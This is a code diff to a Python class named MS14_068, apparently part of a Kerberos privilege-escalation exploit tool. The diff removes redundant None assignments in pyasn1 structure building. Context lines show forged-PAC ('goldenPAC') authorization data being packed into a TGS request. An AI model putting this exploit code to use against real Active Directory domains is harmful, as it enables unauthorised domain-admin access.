@@ -659,7 +659,6 @@ class MS14_068:
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
-        authorizationData[0] = None
         authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
         authorizationData[0]['ad-data'] = str(pacType)
         return encoder.encode(authorizationData)
@@ -676,7 +675,6 @@ class MS14_068:
 
         # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
         ifRelevant = AD_IF_RELEVANT()
-        ifRelevant[0] = None
         ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
         ifRelevant[0]['ad-data'] = goldenPAC
 
@@ -704,7 +702,6 @@ class MS14_068:
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
         seq_set_iter(reqBody, 'etype', (cipher.enctype,))
-        reqBody['enc-authorization-data'] = None
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
 
@@ -737,7 +734,6 @@ class MS14_068:
         # key (Section 5.5.1)
         encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
-        apReq['authenticator'] = None
         apReq['authenticator']['etype'] = cipher.enctype
         apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
@@ -745,8 +741,6 @@ class MS14_068:
 
         tgsReq['pvno'] =  5
         tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-        tgsReq['padata'] = None
-        tgsReq['padata'][0] = None
         tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
@@ -754,7 +748,6 @@ class MS14_068:
         pacRequest['include-pac'] = False
         encodedPacRequest = encoder.encode(pacRequest)
 
-        tgsReq['padata'][1] = None
         tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
         tgsReq['padata'][1]['padata-value'] = encodedPacRequest
 
